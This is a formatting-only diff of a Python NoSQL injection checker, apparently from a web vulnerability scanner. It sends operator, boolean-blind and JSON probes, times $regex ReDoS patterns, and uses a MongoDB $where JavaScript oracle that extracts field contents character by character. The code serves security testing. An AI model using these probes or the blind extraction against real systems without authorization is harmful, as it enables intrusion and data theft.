@@ -74,8 +74,9 @@ def _confirm_operator_blind(sess, url: str, param: str, timeout: float):
             continue
         if c1 != base or o1 == c1:
             continue
-        hits.append("operator differential %s: %s vs ctl %s (base %s)"
-                    % (op_payload[:12], o1, c1, base))
+        hits.append(
+            "operator differential %s: %s vs ctl %s (base %s)" % (op_payload[:12], o1, c1, base)
+        )
     if len(hits) >= 2:
         return True, hits
     return False, []
@@ -97,8 +98,7 @@ def _confirm_boolean_blind(sess, url: str, param: str, timeout: float):
     other.  A constant "differs from baseline" (generic error page) is rejected.
     """
     sigs = {}
-    for label, payload in (("true", _BOOL_TRUE_PAYLOAD),
-                           ("false", _BOOL_FALSE_PAYLOAD)):
+    for label, payload in (("true", _BOOL_TRUE_PAYLOAD), ("false", _BOOL_FALSE_PAYLOAD)):
         a = _resp_sig(sess, url, param, payload, timeout)
         b = _resp_sig(sess, url, param, payload, timeout)
         if a is None or b is None or a != b:
@@ -106,9 +106,8 @@ def _confirm_boolean_blind(sess, url: str, param: str, timeout: float):
         sigs[label] = a
     if sigs["true"] == sigs["false"]:
         return False, []  # identical responses -> not boolean-blind
-    return True, [
-        "boolean differential: true=%s false=%s" % (sigs["true"], sigs["false"])
-    ]
+    return True, ["boolean differential: true=%s false=%s" % (sigs["true"], sigs["false"])]
+
 
 # Catastrophic-backtracking regexes: polynomial/exponential evaluation time
 # on long strings - a reliable MongoDB $regex timing oracle.
@@ -121,16 +120,16 @@ _REDOS_PATTERNS = [
 _REDOS_BENIGN = "^.*$"
 
 
-def _detect_redos(url: str, param: str, sess: requests.Session,
-                  timeout: float, threshold: float = 2.0) -> Dict:
+def _detect_redos(
+    url: str, param: str, sess: requests.Session, timeout: float, threshold: float = 2.0
+) -> Dict:
     """Time-based ReDoS detection via $regex catastrophic backtracking."""
-    result = {"vulnerable": False, "type": "redos", "evidence": [],
-              "delay": 0.0}
+    result = {"vulnerable": False, "type": "redos", "evidence": [], "delay": 0.0}
+
     def _time_regex(pattern: str) -> float:
         try:
             start_t = time.time()
-            sess.post(url, json={param: {"$regex": pattern}},
-                      timeout=timeout + 2)
+            sess.post(url, json={param: {"$regex": pattern}}, timeout=timeout + 2)
             return time.time() - start_t
         except requests.Timeout:
             return timeout + 2.0
@@ -150,23 +149,24 @@ def _detect_redos(url: str, param: str, sess: requests.Session,
         result["vulnerable"] = True
         result["delay"] = round(best, 2)
         result["evidence"].append(
-            "nosqli ReDoS: %s (%.1fs vs benign %.1fs)" % (
-                best_pattern[:30], best, benign_t))
+            "nosqli ReDoS: %s (%.1fs vs benign %.1fs)" % (best_pattern[:30], best, benign_t)
+        )
     return result
 
 
-def _extract_where_blind(url: str, param: str, sess: requests.Session,
-                         timeout: float, max_len: int = 16) -> list:
+def _extract_where_blind(
+    url: str, param: str, sess: requests.Session, timeout: float, max_len: int = 16
+) -> list:
     """Boolean-blind extraction via a MongoDB $where JS oracle.
 
     POSTs {"<param>": {"$where": "<js condition>"}}; true/false conditions
     produce a response-length oracle, then binary-searches characters of
     common fields (this.<field>.charCodeAt(i) > N).
     """
+
     def _oracle(condition: str) -> bool:
         try:
-            r = sess.post(url, json={param: {"$where": condition}},
-                          timeout=timeout)
+            r = sess.post(url, json={param: {"$where": condition}}, timeout=timeout)
             return r.status_code == 200 and len(r.text) > 30
         except Exception:
             return False
@@ -185,8 +185,7 @@ def _extract_where_blind(url: str, param: str, sess: requests.Session,
 
     def _test_gt(condition: str) -> bool:
         try:
-            r = sess.post(url, json={param: {"$where": condition}},
-                          timeout=timeout)
+            r = sess.post(url, json={param: {"$where": condition}}, timeout=timeout)
             return r is not None and len(r.text) > threshold
         except Exception:
             return False
@@ -215,8 +214,13 @@ def _extract_where_blind(url: str, param: str, sess: requests.Session,
     return data
 
 
-def check(url: str, param: str, sess: Optional[requests.Session] = None,
-          timeout: float = 10.0, waf_name: Optional[str] = None) -> dict:
+def check(
+    url: str,
+    param: str,
+    sess: Optional[requests.Session] = None,
+    timeout: float = 10.0,
+    waf_name: Optional[str] = None,
+) -> dict:
     if sess is None:
         sess = requests.Session()
     sess.verify = settings.verify_ssl
@@ -225,8 +229,7 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
     voter = ConfidenceVoter()
 
     try:
-        r_base = sess.get(build_url(url, param, "1"),
-                          timeout=timeout)
+        r_base = sess.get(build_url(url, param, "1"), timeout=timeout)
         base_len = len(r_base.text)
         base_status = r_base.status_code
     except Exception as e:
@@ -240,8 +243,7 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
     for entry in seeds:
         payload = entry["payload"]
         try:
-            r = sess.get(build_url(url, param, payload),
-                         timeout=timeout)
+            r = sess.get(build_url(url, param, payload), timeout=timeout)
             matched_err = False
             for pat in NOSQLI_ERROR_PATTERNS:
                 if re.search(pat, r.text, re.IGNORECASE):
@@ -298,8 +300,7 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
             threshold = entry.get("threshold", 2.5)
             try:
                 start_t = time.time()
-                r = sess.get(build_url(url, param, payload),
-                             timeout=timeout + 2)
+                r = sess.get(build_url(url, param, payload), timeout=timeout + 2)
                 elapsed = time.time() - start_t
                 if elapsed >= threshold:
                     time_hits += 1
@@ -323,8 +324,7 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
         for entry in json_seeds:
             payload_raw = entry["payload"]
             try:
-                r = sess.post(url, json={param: _json.loads(payload_raw)},
-                              timeout=timeout)
+                r = sess.post(url, json={param: _json.loads(payload_raw)}, timeout=timeout)
                 if r.status_code == 200 and len(r.text) > base_len + 10:
                     json_hits += 1
                     result["evidence"].append("nosqli json: %s" % payload_raw[:25])
@@ -385,9 +385,12 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
                 if not result["type"]:
                     result["type"] = "where_blind"
                 result["evidence"].append(
-                    "nosqli $where blind: %s" % "; ".join(
+                    "nosqli $where blind: %s"
+                    % "; ".join(
                         "%s=%s" % (d["source"].replace("where_blind_", ""), d["value"])
-                        for d in where_data[:4]))
+                        for d in where_data[:4]
+                    )
+                )
                 voter.add_vote("where_blind_extract", 0.7)
         except Exception as e:
             logger.debug("nosqli where blind: %s", e)
